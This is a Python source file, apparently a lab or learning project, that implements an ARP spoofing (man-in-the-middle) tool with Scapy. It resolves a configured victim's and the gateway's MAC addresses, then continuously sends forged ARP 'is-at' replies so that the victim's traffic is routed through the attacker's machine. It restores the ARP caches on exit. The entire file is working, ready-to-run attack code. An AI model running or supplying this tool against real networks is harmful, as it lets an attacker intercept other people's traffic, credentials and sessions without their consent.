"""
Project: ARP Spoofing Tool
Component: Attack
Description:
    Performs ARP poisoning between a victim and the router.
    Continuously sends forged ARP replies to intercept traffic and
    restores legitimate network mappings upon exit.
"""

# ========================
# Imports
# ========================
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *
import time
import sys

# ========================
# Configuration
# ========================
VICTIM_IP = "192.168.56.103"  # Target victim IP (must be set before execution)
SLEEP_INTERVAL = 2  # Delay between poisoning cycles (seconds)


# ========================
# Networking Utilities
# ========================
def get_mac(target_ip: str) -> str:
    """
    Retrieves the MAC address for a given IP by sending an ARP Request.
    Broadcasts to ff:ff:ff:ff:ff:ff to find the hardware owner.
    """
    packet: Packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, op=1)

    # srp() sends and receives packets at layer 2
    ans, _ = srp(packet, timeout=2, inter=0.1, verbose=False)

    if not ans:
        raise ValueError(f"Could not resolve MAC for {target_ip}. Is the host up?")

    return ans[0][1].hwsrc


def craft_poison_reply(
        target_ip: str,
        target_mac: str,
        spoof_ip: str,
        attacker_mac: str
) -> Packet:
    """
    Crafts a malicious ARP "is-at" reply (op=2).
    Tells target_ip that spoof_ip is located at attacker_mac.
    """
    return Ether(
        src=attacker_mac,
        dst=target_mac
    ) / ARP(
        psrc=spoof_ip,
        pdst=target_ip,
        hwsrc=attacker_mac,
        hwdst=target_mac,
        op=2
    )


def craft_restore_packets(
        target_ip: str,
        target_mac: str,
        router_ip: str,
        router_mac: str
) -> list[Packet]:
    """
    Crafts legitimate ARP replies to reset the cache of both the victim
    and the router to their original, correct states.
    """
    victim_restore = Ether(dst=target_mac) / ARP(
        op=2,
        psrc=router_ip,
        hwsrc=router_mac,
        pdst=target_ip,
        hwdst=target_mac
    )

    router_restore = Ether(dst=router_mac) / ARP(
        op=2,
        psrc=target_ip,
        hwsrc=target_mac,
        pdst=router_ip,
        hwdst=router_mac
    )

    return [victim_restore, router_restore]


# ========================
# Core Logic
# ========================
def run_attack():
    """
    Main execution loop: resolves targets, performs poisoning,
    and handles clean-up on exit.
    """
    # Get the local attacker MAC address
    this_mac = get_if_hwaddr(conf.iface)

    # Automatically identify the default gateway (router)
    try:
        router_ip: str = conf.route.route("0.0.0.0")[2]
    except Exception as e:
        print(f"[-] Error identifying router: {e}")
        sys.exit(1)

    victim_ip: str = VICTIM_IP

    print(f"[*] Resolving MAC addresses...")
    try:
        router_mac = get_mac(router_ip)
        victim_mac = get_mac(victim_ip)
    except ValueError as e:
        print(f"[-] {e}")
        sys.exit(1)

    print(f"[*] Poisoning initiated between {victim_ip} and {router_ip}")

    # Pre-craft packets for performance
    router_reply = craft_poison_reply(router_ip, router_mac, victim_ip, this_mac)
    victim_reply = craft_poison_reply(victim_ip, victim_mac, router_ip, this_mac)

    try:
        while True:
            # Send the forged packets at Layer 2
            sendp(router_reply, verbose=False)
            sendp(victim_reply, verbose=False)
            time.sleep(SLEEP_INTERVAL)

    except KeyboardInterrupt:
        print("\n[!] KeyboardInterrupt detected. Restoring network...")

        # Restore the ARP tables to prevent network downtime
        restores = craft_restore_packets(
            victim_ip,
            victim_mac,
            router_ip,
            router_mac
        )

        victim_restore, router_restore = restores

        # Send multiple restore packets to ensure they are received
        sendp(victim_restore, count=7, inter=0.2, verbose=False)
        sendp(router_restore, count=7, inter=0.2, verbose=False)

        print("[+] Network restored. Exiting.")
        sys.exit(0)


# ========================
# Entry Point
# ========================
if __name__ == "__main__":
    run_attack()